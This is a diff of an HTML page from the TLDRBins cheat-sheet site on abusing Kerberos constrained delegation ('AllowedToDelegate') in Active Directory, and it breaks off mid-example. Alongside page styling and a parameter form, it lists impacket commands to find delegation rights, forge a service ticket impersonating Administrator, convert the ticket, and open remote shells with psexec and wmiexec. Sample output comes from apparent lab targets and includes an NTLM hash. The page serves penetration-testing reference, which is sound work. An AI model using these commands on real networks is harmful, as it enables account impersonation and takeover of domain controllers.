@@ -1,191 +1,164 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="utf-8">
+<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
+<meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>AllowedToDelegate | TLDRBins</title>
-<meta name="robots" content='index, follow'>
+<meta name="robots" content="index, follow">
 <meta name="description" content="">
-<meta name="generator" content="hugo-index">
+<title>AllowedToDelegate | TLDRBins</title>
 <link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
-<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
-<script>
-    window.addEventListener('load', () => {
-        quicklink.listen();
-    });
-</script>
-
-  </head>
-  <body><header>
+</head>
+<body>
+<header>
   <h1>
     <a href="https://tldrbins.github.io/">
       <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
       <span>TLDRBins</span>
-    </a>
-    <span class="hl">/</span>
-    <a href="https://tldrbins.github.io/allowedtodelegate/">
-      <span>AllowedToDelegate</span>
-    </a>
-  </h1>
-  <div class="js-toggle-wrapper">
-    <div class="js-toggle">
-        <div class="js-toggle-track">
-            <div class="js-toggle-track-check">
-                <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
-            <div class="js-toggle-track-x">
-                <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
+    </a><span class="hl"> / </span>
+    <a href="https://tldrbins.github.io/allowedtodelegate/"><span>AllowedToDelegate</span></a></h1>
+  <div class="theme-toggle-wrapper">
+    <div class="theme-toggle">
+      <div class="theme-toggle-track">
+        <div class="theme-toggle-track-dark">
+          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
         </div>
-        <div class="js-toggle-thumb"></div>
-        <input class="js-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+        <div class="theme-toggle-track-light">
+          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+      </div>
+      <div class="theme-toggle-thumb"></div>
+      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
     </div>
-</div>
-    
-<style>
- 
+  </div>
+  <style>
+  .theme-toggle-wrapper, .theme-toggle {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      box-sizing: border-box;
+  }
 
- 
-.js-toggle-wrapper, .js-toggle {
-    margin: 0;
-    padding: 0;
-    border: 0;
-    box-sizing: border-box;
-}
+  .theme-toggle-wrapper {
+      display: table;
+      float: right;
+      margin-left: auto;
+  }
 
-.js-toggle-wrapper {
-    display: table;
-    float: right;
-    margin-left: auto;
-}
+  .theme-toggle {
+      touch-action: pan-x;
+      display: inline-block;
+      position: relative;
+      cursor: pointer;
+      background-color: transparent;
+      user-select: none;
+  }
 
-.js-toggle {
-    touch-action: pan-x;
-    display: inline-block;
-    position: relative;
-    cursor: pointer;
-    background-color: transparent;
-    user-select: none;
-}
+  .theme-toggle-screenreader-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+  }
 
-.js-toggle-screenreader-only {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    margin: -1px;
-    padding: 0;
-    overflow: hidden;
-    clip: rect(0, 0, 0, 0);
-}
+  .theme-toggle-track {
+      width: 50px;
+      height: 24px;
+      border-radius: 30px;
+      background-color: hsl(223, 61%, 44%);
+      transition: background-color 0.2s ease;
+  }
 
-.js-toggle-track {
-    width: 50px;
-    height: 24px;
-    border-radius: 30px;
-    background-color: hsl(223, 61%, 44%);
-    transition: background-color 0.2s ease;
-}
+  .theme-toggle-track-dark,
+  .theme-toggle-track-light {
+      position: absolute;
+      width: 17px;
+      height: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      transition: opacity 0.25s ease;
+  }
 
-.js-toggle-track-check,
-.js-toggle-track-x {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    top: 50%;
-    transform: translateY(-50%);
-    transition: opacity 0.25s ease;
-}
+  .theme-toggle-track-dark {
+      left: 5px;
+      opacity: 0;
+  }
 
-.js-toggle-track-check {
-    left: 5px;
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track-dark {
+      opacity: 1;
+  }
 
-.js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-}
+  .theme-toggle-track-light {
+      right: 5px;
+      opacity: 1;
+  }
 
-.js-toggle-track-x {
-    right: 5px;
-    opacity: 1;
-}
+  .theme-toggle--checked .theme-toggle-track-light {
+      opacity: 0;
+  }
 
-.js-toggle--checked .js-toggle-track-x {
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track {
+      background-color: hsl(222, 14%, 7%);
+  }
 
-.js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-}
+  .theme-toggle-thumb {
+      position: absolute;
+      top: 1px;
+      left: 1px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background-color: #fafafa;
+      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+  }
 
-.js-toggle-thumb {
-    position: absolute;
-    top: 1px;
-    left: 1px;
-    width: 22px;
-    height: 22px;
-    border-radius: 50%;
-    background-color: #fafafa;
-    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
-}
+  .theme-toggle--checked .theme-toggle-thumb {
+      transform: translateX(26px);
+  }
+  </style>
+  <script>
+      const body = document.body;
+      const themeSwitcher = document.querySelector('.theme-toggle');      
 
-.js-toggle--checked .js-toggle-thumb {
-    transform: translateX(26px);
-}
-</style>
+      themeSwitcher.addEventListener('click', () => {
+          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
+          body.classList.toggle('dark-mode', isDarkMode);
+          if (isDarkMode) {
+              localStorage.setItem('darkMode', 'true');
+          } else {
+              localStorage.removeItem('darkMode');
+          }
+      });      
 
-<script>
-    var body = document.body;
-    var switcher = document.getElementsByClassName('js-toggle')[0];
-
-    
-    switcher.addEventListener("click", function() {
-        this.classList.toggle('js-toggle--checked');
-        
-        if (this.classList.contains('js-toggle--checked')) {
-            body.classList.add('dark-mode');
-            
-            localStorage.setItem('darkMode', 'true');
-        } else {
-            body.classList.remove('dark-mode');
-            setTimeout(function() {
-                localStorage.removeItem('darkMode');
-            }, 100);
-        }
-    })
-
-    
-    if (localStorage.getItem('darkMode')) {
-        
-        switcher.classList.add('js-toggle--checked');
-        body.classList.add('dark-mode');
-    }
-</script>
+      if (localStorage.getItem('darkMode')) {
+          themeSwitcher.classList.add('theme-toggle--checked');
+          body.classList.add('dark-mode');
+      }
+  </script>
   <p class="desc"></p>
 </header>
-<div class="main">
-
+<main>
 <ul class="tagsList single">
-  
   <li><a href="https://tldrbins.github.io/@pass-the-ticket/">Pass-the-Ticket</a></li>
-  
   <li><a href="https://tldrbins.github.io/@silver-ticket/">Silver Ticket</a></li>
-  
   <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
-  
   <li><a href="https://tldrbins.github.io/@allowedtodelegate/">Allowedtodelegate</a></li>
-  
   <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
-  
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
-  
 </ul>
 <hr>
 <div class="content">
+  <div class="tips">
+  <p><strong>Usage Tips:</strong></p>
+  <ul>
+    <li>Click inside a code block to copy (excludes comments).</li>
+    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
+    <li>Click outside to collapse all examples.</li>
+  </ul>
+</div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;">
-	</form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="ALT_SERVICE">ALT SERVICE: </label><input type="text" name="ALT_SERVICE"></div><div class="input-group"><label for="BASE64_TICKET">BASE64 TICKET: </label><input type="text" name="BASE64_TICKET"></div><div class="input-group"><label for="CCACHE_FILE">CCACHE FILE: </label><input type="text" name="CCACHE_FILE"></div><div class="input-group"><label for="CMD">CMD: </label><input type="text" name="CMD"></div><div class="input-group"><label for="COMPUTER_NAME">COMPUTER NAME: </label><input type="text" name="COMPUTER_NAME"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="IMPERSONATE_USER">IMPERSONATE USER: </label><input type="text" name="IMPERSONATE_USER"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="SERVICE">SERVICE: </label><input type="text" name="SERVICE"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Params Form</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -193,7 +166,6 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-
 <style>
 #dynamicFormContainer {
 	width: 100%;
@@ -325,19 +297,22 @@ body.dark-mode #dynamicFormContainer button:hover {
 }
 </style>
   <h3 id="privesc-1-forge-a-ticket">Privesc #1: Forge a Ticket</h3>
-<p>
-<button data-tabset="set1" data-tabcontent="tab1" >Linux</button>
+<p class="tabs">
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
 
-<button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
+<button data-tabset="set1" data-tabcontent="tab2">Windows</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-pre-check">1. Pre-Check</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
-</span></span><span class="line"><span class="cl"><span class="go">impacket-findDelegation &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC_IP&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
-</span></span><span class="line"><span class="cl"><span class="go">impacket-findDelegation &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -dc-ip &lt;DC_IP&gt; -hashes :&lt;HASH&gt; -no-pass
-</span></span></span></code></pre></div><h4 id="2-get-a-service-ticket">2. Get a Service Ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getST -dc-ip &lt;DC_IP&gt; -spn &#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; -hashes :&lt;HASH&gt; -impersonate &#39;&lt;IMPERSONATE_USER&gt;&#39; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.intelligence.htb <span class="o">&amp;&amp;</span> impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator <span class="s1">&#39;intelligence.htb/svc_int&#39;</span>
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-pre-check">1. Pre-Check</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">impacket-findDelegation '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>:<span class="o">&lt;PASSWORD&gt;</span>' -dc-ip <span class="o">&lt;DC_IP&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">impacket-findDelegation '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>' -dc-ip <span class="o">&lt;DC_IP&gt;</span> -hashes :<span class="o">&lt;HASH&gt;</span> -no-pass
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-get-a-service-ticket">2. Get a Service Ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC&gt;</span> &amp;&amp; impacket-getST -dc-ip <span class="o">&lt;DC_IP&gt;</span> -spn '<span class="o">&lt;SERVICE&gt;</span>/<span class="o">&lt;TARGET_DOMAIN&gt;</span>' -hashes :<span class="o">&lt;HASH&gt;</span> -impersonate '<span class="o">&lt;IMPERSONATE_USER&gt;</span>' '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.intelligence.htb <span class="o">&amp;&amp;</span> impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator <span class="s1">'intelligence.htb/svc_int'</span>
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
@@ -346,25 +321,28 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2self
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2Proxy
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
-</span></span></span></code></pre></div><h4 id="3-convert-ticket-optional">3. Convert Ticket [Optional]</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py &#39;&lt;BASE64_TICKET&gt;&#39; &#39;&lt;IMPERSONATE_USER&gt;.kirbi&#39; &#39;&lt;IMPERSONATE_USER&gt;.ccache&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 ~/Tools/RubeusToCcache/rubeustoccache.py &#39;doIG9DCCBv ...[SNIP]... 9yZS5jb20=&#39; &#39;administrator.kirbi&#39; &#39;administrator.ccache&#39;
+</span></span></span></div></pre></div><h4 id="3-convert-ticket-optional">3. Convert Ticket [Optional]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py '<span class="o">&lt;BASE64_TICKET&gt;</span>' '<span class="o">&lt;IMPERSONATE_USER&gt;</span>.kirbi' '<span class="o">&lt;IMPERSONATE_USER&gt;</span>.ccache'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">python3 ~/Tools/RubeusToCcache/rubeustoccache.py 'doIG9DCCBv ...[SNIP]... 9yZS5jb20=' 'administrator.kirbi' 'administrator.ccache'
 </span></span></span><span class="line"><span class="cl"><span class="go">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
 </span></span></span><span class="line"><span class="cl"><span class="go">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
 </span></span></span><span class="line"><span class="cl"><span class="go">╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
 </span></span></span><span class="line"><span class="cl"><span class="go">              By Solomon Sklash
 </span></span></span><span class="line"><span class="cl"><span class="go">          github.com/SolomonSklash
-</span></span></span><span class="line"><span class="cl"><span class="go">   Inspired by Zer1t0&#39;s ticket_converter.py
+</span></span></span><span class="line"><span class="cl"><span class="go">   Inspired by Zer1t0's ticket_converter.py
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Writing decoded .kirbi file to administrator.kirbi
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Writing converted .ccache file to administrator.ccache
-</span></span></span><span class="line"><span class="cl"><span class="go">[*] All done! Don&#39;t forget to set your environment variable: export KRB5CCNAME=administrator.ccache
-</span></span></span></code></pre></div><h4 id="4-remote">4. Remote</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&#39;&lt;CCACHE_FILE&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> psexec
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-psexec &#39;&lt;DOMAIN&gt;/&lt;IMPERSONATE_USER&gt;@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-psexec client.example.com/administrator@dc01.client.example.com -k -no-pass
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=administrator.ccache
+</span></span></span></div></pre></div><h4 id="4-remote">4. Remote</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME='<span class="o">&lt;CCACHE_FILE&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+</span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> psexec
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC&gt;</span> &amp;&amp; impacket-psexec '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;IMPERSONATE_USER&gt;</span>@<span class="o">&lt;TARGET_DOMAIN&gt;</span>' -k -no-pass
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> impacket-psexec client.example.com/administrator@dc01.client.example.com -k -no-pass
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting shares on dc01.client.example.com.....
@@ -378,29 +356,32 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">(c) 2016 Microsoft Corporation. All rights reserved.
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\Windows\system32&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> wmiexec
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; wmiexec.py &#39;&lt;DOMAIN&gt;/&lt;IMPERSONATE_USER&gt;@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.intelligence.htb <span class="o">&amp;&amp;</span> wmiexec.py -k -no-pass administrator@dc.intelligence.htb
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> wmiexec
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o">&lt;DC&gt;</span> &amp;&amp; wmiexec.py '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;IMPERSONATE_USER&gt;</span>@<span class="o">&lt;TARGET_DOMAIN&gt;</span>' -k -no-pass
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.intelligence.htb <span class="o">&amp;&amp;</span> wmiexec.py -k -no-pass administrator@dc.intelligence.htb
